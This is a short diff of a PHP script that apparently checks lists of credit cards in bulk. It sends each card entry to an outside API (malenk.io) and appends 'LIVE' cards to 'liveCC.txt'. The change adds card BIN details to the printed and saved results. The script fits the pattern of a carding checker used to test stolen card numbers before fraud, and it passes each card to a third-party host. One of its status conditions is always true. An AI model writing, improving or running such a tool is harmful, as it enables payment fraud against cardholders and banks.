@@ -20,8 +20,8 @@ foreach($delimeter as $format) {
 $format = trim($format);
     $response = file_get_contents("http://malenk.io/fhAPI/?format=".trim($format));
     if(json_decode($response,1)['status'] == "LIVE") {
-      echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => LIVE\n";
-      file_put_contents("liveCC.txt", $format."\n", FILE_APPEND);
+      echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." - ".@json_decode($response,1)['bin_info']." => LIVE\n";
+      file_put_contents("liveCC.txt", $format." ".json_decode($response,1)['bin_info']."\n", FILE_APPEND);
     } else {
       echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => DIE ".json_decode($response,1)['message']."\n";
 	  if(json_decode($response,1)['status'] !== "DIE" || json_decode($response,1)['status'] !== "LIVE") {
